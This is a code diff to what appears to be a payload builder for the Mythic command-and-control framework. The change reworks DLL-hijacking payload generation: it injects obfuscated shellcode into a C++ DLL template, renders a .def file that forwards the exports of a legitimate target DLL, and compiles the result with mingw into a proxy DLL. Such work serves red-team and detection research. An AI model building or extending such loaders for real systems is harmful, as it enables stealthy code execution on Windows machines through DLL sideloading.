@@ -339,10 +339,12 @@ NOTE: Does not (currently) support encoded or compressed payloads.
             templates_path = PurePath(agent_build_path) / "templates"
             dll_hijack_template_path = templates_path / "dll_template.cpp"
             dll_target_path = templates_path / "dll_target.dll"
+            dll_exports_path = templates_path / "proxy.def"
 
             templates_path = str(templates_path)
-            dll_target_path = str(dll_target_path)
             dll_hijack_template_path = str(dll_hijack_template_path)
+            dll_target_path = str(dll_target_path)
+            dll_exports_path = str(dll_exports_path)
 
             environment = Environment(loader=FileSystemLoader(templates_path))
 
@@ -476,23 +478,32 @@ NOTE: Does not (currently) support encoded or compressed payloads.
             with open(dll_target_path, "wb") as file:
                 file.write(file_content)
 
-            pragmas = await generate_proxies(dllfile=dll_target_path)
+            exports = await generate_proxies(dllfile=dll_target_path)
 
             with open(obfuscated_shellcode_path, "r") as file:
                 shellcode_content = file.read()
 
-            dll_placeholder = {
-                "PRAGMAS": pragmas,
+            shellcode = {
                 "SHELLCODE": shellcode_content
             }
 
+            exports_list = {
+                "EXPORTS": exports
+            }
+
             dll_template = environment.get_template("dll_template.cpp")
-            output = dll_template.render(**dll_placeholder)
+            proxy_template = environment.get_template("proxy.def")
+            dll_output = dll_template.render(**shellcode)
+            proxy_output = proxy_template.render(**exports_list)
+
             with open(dll_hijack_template_path, "w") as file:
-                file.write(output)
+                file.write(dll_output)
+
+            with open(dll_exports_path, "w") as file:
+                file.write(proxy_output)
 
             # Check if the file size stayed the same as the template
-            if os.stat(dll_hijack_template_path).st_size == 1598:
+            if os.stat(dll_hijack_template_path).st_size == 1598 or os.stat(dll_exports_path).st_size == 13:
                 response.status = BuildStatus.Error
                 response.build_message = "Failed to proxy the given file."
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -513,12 +524,13 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                 ))
 
             cmd = [
-                "x86_64-w64-mingw32-gcc-win32",
+                "x86_64-w64-mingw32-gcc",
                 "-o", payload_path,
                 dll_hijack_template_path,
+                dll_exports_path,
                 "-shared",
-                "-I/usr/x86_64-w64-mingw32/include/windows.h",
-                "-Wall", "-w", "-s"
+                "-I/usr/x86_64-w64-mingw32/include",
+                "-L/usr/x86_64-w64-mingw32/lib",
             ]
             proc = await asyncio.create_subprocess_exec(
                 *cmd,
